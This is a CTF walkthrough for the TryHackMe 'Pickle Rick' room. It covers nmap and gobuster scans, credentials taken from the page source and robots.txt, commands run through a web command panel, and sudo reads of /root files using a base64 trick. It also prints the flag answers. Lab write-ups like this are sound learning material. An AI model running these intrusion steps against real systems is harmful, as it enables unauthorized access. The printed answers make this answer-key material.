<!-- TOC -->

- [Pickle Rick](#pickle-rick)
    - [Discovery and Scanning](#discovery-and-scanning)
    - [Exploitation](#exploitation)

<!-- /TOC -->

# Pickle Rick

[Pickle Rick Room](https://tryhackme.com/room/picklerick)

A Rick and Morty CTF. Help turn Rick back into a human!

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

| Title | IP Address |
| :---- | :---- |
| Pickle Rick | 10.10.136.127 |

## Discovery and Scanning

```bash
sudo nmap -A -vv -T4 -oA initial 10.10.136.127
```

Result: [initial.nmap](initial.nmap)

> `80/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))`

View Page Source: `http://10.10.136.127`

> `Username: R1ckRul3s`

```bash
gobuster dir -u 10.10.136.127:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh,cer,css,htm,html,js,jsp,php,py,xhtml -t 100
```

> ```
> /index.html           (Status: 200) [Size: 1062]
> /login.php            (Status: 200) [Size: 882]
> /robots.txt           (Status: 200) [Size: 17]
> /assets               (Status: 301) [Size: 315] [--> http://10.10.136.127/assets/]
> /portal.php           (Status: 302) [Size: 0] [--> /login.php]                    
> /denied.php           (Status: 302) [Size: 0] [--> /login.php]
> /clue.txt             (Status: 200) [Size: 54]                    
> /server-status        (Status: 403) [Size: 301]   
> ```

`http://10.10.136.127/robots.txt`

> `Wubbalubbadubdub`

`http://10.10.136.127/clue.txt`

> `Look around the file system for the other ingredient.`

## Exploitation

Using `R1ckRul3s:Wubbalubbadubdub`:

`http://10.10.136.127/login.php`

View Page Source: `http://10.10.136.127/portal.php#`

> `<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->`

Decoded 7 times with `base64` -> `rabbit hole`

Using the Command Panel:

```bash
sudo -l
```

> `(ALL) NOPASSWD: ALL`

```bash
ls
```

> `Sup3rS3cretPickl3Ingred.txt`

`http://10.10.136.127/Sup3rS3cretPickl3Ingred.txt`

> `mr. meeseek hair`

```bash
ls -la /home/rick
```

> `-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients`

```bash
base64 "/home/rick/second ingredients" | base64 -d
```

> `1 jerry tear`

```bash
sudo ls -la /root
```

> `-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt`

```bash
sudo base64 "/root/3rd.txt" | base64 -d
```

> `3rd ingredients: fleeb juice`
